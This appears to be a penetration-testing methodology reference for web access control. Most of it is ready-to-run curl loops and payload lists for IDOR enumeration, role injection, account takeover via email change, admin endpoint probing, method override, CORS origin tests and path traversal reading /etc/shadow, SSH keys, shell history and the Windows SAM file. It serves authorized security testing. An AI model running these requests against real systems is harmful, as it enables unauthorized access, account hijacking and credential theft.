# Access Control and Authorization Testing Reference

Comprehensive testing methodology for access control, authorization boundaries, and path traversal vulnerabilities. All techniques are backend-agnostic and operate at the HTTP level.

---

## IDOR (Insecure Direct Object Reference) Testing

### Methodology

1. Authenticate as User A and access their resources, noting the object identifiers (IDs, UUIDs, filenames)
2. Authenticate as User B (or use no authentication)
3. Attempt to access User A's resources using User B's session

### Sequential ID Enumeration

```bash
# Get current user's resource
curl -s -H "Authorization: Bearer $USER_A_TOKEN" "http://TARGET/api/users/1"

# Try accessing other users' resources
for id in $(seq 1 10); do
  echo -n "User $id: "
  curl -s -w "HTTP:%{http_code}" -H "Authorization: Bearer $USER_A_TOKEN" \
    "http://TARGET/api/users/$id"
  echo
done

# Same for other resource types
for id in $(seq 1 20); do
  echo -n "Order $id: "
  curl -s -w "HTTP:%{http_code}" -H "Authorization: Bearer $USER_A_TOKEN" \
    "http://TARGET/api/orders/$id"
  echo
done
```

### UUID-Based IDOR

```bash
# If UUIDs are used, check if they are predictable or leaked
# Look for UUIDs in API responses, HTML source, or error messages
curl -s -H "Authorization: Bearer $USER_A_TOKEN" "http://TARGET/api/users" | jq '.[] | .id'

# Try accessing another user's UUID
curl -s -H "Authorization: Bearer $USER_A_TOKEN" \
  "http://TARGET/api/users/UUID_FROM_LISTING"
```

### Horizontal Access Control Testing

```bash
# User A's token accessing User B's data
# Profile data
curl -s -H "Authorization: Bearer $USER_A_TOKEN" "http://TARGET/api/users/USER_B_ID/profile"

# Private messages
curl -s -H "Authorization: Bearer $USER_A_TOKEN" "http://TARGET/api/users/USER_B_ID/messages"

# Financial data
curl -s -H "Authorization: Bearer $USER_A_TOKEN" "http://TARGET/api/users/USER_B_ID/transactions"

# Modify another user's data
curl -s -X PUT -H "Authorization: Bearer $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}' \
  "http://TARGET/api/users/USER_B_ID/profile"

# Delete another user's resource
curl -s -X DELETE -H "Authorization: Bearer $USER_A_TOKEN" \
  "http://TARGET/api/users/USER_B_ID/posts/1"
```

### Vertical Access Control Testing

```bash
# Regular user accessing admin endpoints
curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" "http://TARGET/api/admin"
curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" "http://TARGET/api/admin/users"
curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" "http://TARGET/api/admin/settings"
curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" "http://TARGET/api/admin/logs"
curl -s -H "Authorization: Bearer $REGULAR_USER_TOKEN" "http://TARGET/api/admin/dashboard"

# Regular user performing admin actions
curl -s -X POST -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "http://TARGET/api/admin/users/1/role"

curl -s -X DELETE -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
  "http://TARGET/api/admin/users/2"
```

### IDOR Detection Indicators

- HTTP 200 with another user's data (confirmed IDOR)
- Different response content when accessing own vs others' resources with same auth
- Ability to modify another user's data
- Sequential or predictable IDs enabling enumeration

---

## Privilege Escalation

### Role Parameter Manipulation

```bash
# During registration, inject role parameter
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","role":"admin"}' \
  "http://TARGET/api/register"

# During profile update, inject role change
curl -s -X PUT -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"user","role":"admin"}' \
  "http://TARGET/api/profile"

# Try various role parameter names
curl -s -X PUT -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"isAdmin":true}' "http://TARGET/api/profile"

curl -s -X PUT -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"admin":1,"privilege":"admin","access_level":9999}' \
  "http://TARGET/api/profile"
```

### Admin Endpoint Access with Regular User Token

```bash
# Common admin endpoints to test
ADMIN_PATHS=(
  "/admin"
  "/api/admin"
  "/api/admin/users"
  "/api/admin/config"
  "/api/admin/settings"
  "/api/admin/logs"
  "/api/admin/debug"
  "/api/admin/dashboard"
  "/api/v1/admin"
  "/management"
  "/actuator"
  "/actuator/env"
  "/console"
  "/_admin"
  "/panel"
)

for path in "${ADMIN_PATHS[@]}"; do
  echo -n "$path: "
  curl -s -w "HTTP:%{http_code}" -o /dev/null \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
    "http://TARGET$path"
  echo
done
```

### Privilege Escalation via API Parameter Pollution

```bash
# Send duplicate parameters (parameter pollution)
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":1,"user_id":2}' "http://TARGET/api/profile"

# Array injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":[1,2]}' "http://TARGET/api/profile"

# Nested object injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user":{"id":1,"role":"admin"}}' "http://TARGET/api/profile"
```

---

## Path Traversal

### Basic Payloads

```
../
../../
../../../
../../../../
../../../../../
../../../../../../etc/passwd
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
```

### URL-Encoded Payloads

```
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e%5c
..%5c
%252e%252e%252f
..%252f
%c0%ae%c0%ae%c0%af
..%c0%af
%uff0e%uff0e%u2215
```

### Double Encoding

```
%252e%252e%252f
%252e%252e/
..%252f
%2e%2e%252f
```

### Null Byte Injection (Legacy Systems)

```
../../etc/passwd%00
../../etc/passwd%00.jpg
../../etc/passwd%2500
../../../etc/passwd\0.png
```

### OS-Specific Paths

**Linux/Unix targets:**
```
../../etc/passwd
../../etc/shadow
../../etc/hosts
../../etc/hostname
../../proc/self/environ
../../proc/self/cmdline
../../proc/version
../../var/log/apache2/access.log
../../var/log/nginx/access.log
../../home/user/.bash_history
../../home/user/.ssh/id_rsa
```

**Windows targets:**
```
..\..\windows\system32\drivers\etc\hosts
..\..\windows\win.ini
..\..\windows\system.ini
..\..\inetpub\wwwroot\web.config
..\..\windows\system32\config\SAM
```

### Curl Examples

```bash
# In query parameters
curl -s "http://TARGET/api/files?path=../../etc/passwd"
curl -s "http://TARGET/api/download?file=../../../etc/passwd"
curl -s "http://TARGET/api/read?filename=....//....//etc/passwd"

# URL-encoded
curl -s "http://TARGET/api/files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s "http://TARGET/api/files?path=..%252f..%252fetc%252fpasswd"

# In path segments
curl -s "http://TARGET/static/../../etc/passwd"
curl -s "http://TARGET/api/files/..%2f..%2f..%2fetc%2fpasswd"

# In JSON body
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"filepath":"../../etc/passwd"}' "http://TARGET/api/read-file"

# In headers
curl -s -H "X-File: ../../etc/passwd" "http://TARGET/api/file-proxy"

# Bypassing filters that strip ../
curl -s "http://TARGET/api/files?path=....//....//etc/passwd"
curl -s "http://TARGET/api/files?path=..././..././etc/passwd"
```

### Path Traversal Detection Indicators

- Response contains file contents (`root:x:0:0:`, `[extensions]`, `[fonts]`)
- Error messages revealing absolute file paths
- Different response sizes for valid vs invalid traversal paths
- HTTP 200 with unexpected content type

---

## Missing Function-Level Access Control

### Testing Unauthenticated Access

```bash
# Test sensitive endpoints without any authentication
ENDPOINTS=(
  "/api/users"
  "/api/admin"
  "/api/config"
  "/api/settings"
  "/api/logs"
  "/api/debug"
  "/api/internal"
  "/api/private"
  "/api/management"
  "/api/system"
  "/api/backup"
  "/api/export"
  "/api/import"
  "/api/database"
  "/api/metrics"
  "/api/health"
)

for endpoint in "${ENDPOINTS[@]}"; do
  echo -n "No auth $endpoint: "
  curl -s -w "HTTP:%{http_code}" -o /dev/null "http://TARGET$endpoint"
  echo
done
```

### Testing with Regular User Authentication

```bash
for endpoint in "${ENDPOINTS[@]}"; do
  echo -n "Regular user $endpoint: "
  curl -s -w "HTTP:%{http_code}" -o /dev/null \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
    "http://TARGET$endpoint"
  echo
done
```

### Detection Indicators

- HTTP 200 on admin endpoints without authentication (critical)
- HTTP 200 on admin endpoints with regular user token (high)
- Ability to perform admin actions (user management, configuration changes)
- Same response for authenticated and unauthenticated requests on protected endpoints

---

## HTTP Method Tampering

### Testing Unexpected Methods

```bash
ENDPOINT="http://TARGET/api/users/1"

for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -s -w "HTTP:%{http_code}" -o /dev/null -X $method "$ENDPOINT"
  echo
done
```

### Method Override Headers

```bash
# Some frameworks support method override headers
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" \
  "http://TARGET/api/users/1"

curl -s -X POST -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' "http://TARGET/api/users/1"

curl -s -X POST "http://TARGET/api/users/1?_method=DELETE"
```

### Detection Indicators

- DELETE/PUT methods accepted when only GET/POST are documented
- Different access control for different methods on same endpoint
- Method override headers bypass access controls

---

## CORS Misconfiguration Testing

### Test with Various Origin Headers

```bash
# Reflected origin (critical if with credentials)
curl -s -D - -o /dev/null -H "Origin: https://evil.com" \
  "http://TARGET/api/users"

# Null origin
curl -s -D - -o /dev/null -H "Origin: null" \
  "http://TARGET/api/users"

# Subdomain matching bypass
curl -s -D - -o /dev/null -H "Origin: https://evil.TARGET.com" \
  "http://TARGET/api/users"

# Prefix/suffix bypass
curl -s -D - -o /dev/null -H "Origin: https://TARGETevil.com" \
  "http://TARGET/api/users"

curl -s -D - -o /dev/null -H "Origin: https://evil-TARGET.com" \
  "http://TARGET/api/users"
```

### Check Response Headers

Look for these headers in the response:

```
Access-Control-Allow-Origin: *                    # Wildcard (medium if no credentials)
Access-Control-Allow-Origin: https://evil.com     # Reflects attacker origin (high)
Access-Control-Allow-Credentials: true            # With reflected origin = critical
Access-Control-Allow-Methods: *                   # Overly permissive
Access-Control-Allow-Headers: *                   # Overly permissive
```

### CORS Detection Indicators

- `Access-Control-Allow-Origin` reflects the attacker's Origin header
- `Access-Control-Allow-Credentials: true` combined with reflected origin
- `Access-Control-Allow-Origin: *` on endpoints returning sensitive data
- `Access-Control-Allow-Origin: null` accepted (exploitable via sandboxed iframes)

---

## General Access Control Testing Checklist

1. **Authentication boundaries**: Can any protected endpoint be accessed without authentication?
2. **Horizontal access**: Can User A access User B's resources?
3. **Vertical access**: Can a regular user access admin functionality?
4. **Object-level access**: Are all object references checked against the authenticated user?
5. **Method-level access**: Are different HTTP methods checked independently?
6. **Field-level access**: Can users modify fields they should not (role, permissions)?
7. **CORS**: Is cross-origin access properly restricted?
8. **Path traversal**: Can file paths be manipulated to access unauthorized files?
9. **Indirect references**: Are object references in request bodies also validated?
10. **State transitions**: Can users skip required steps (e.g., payment before checkout)?
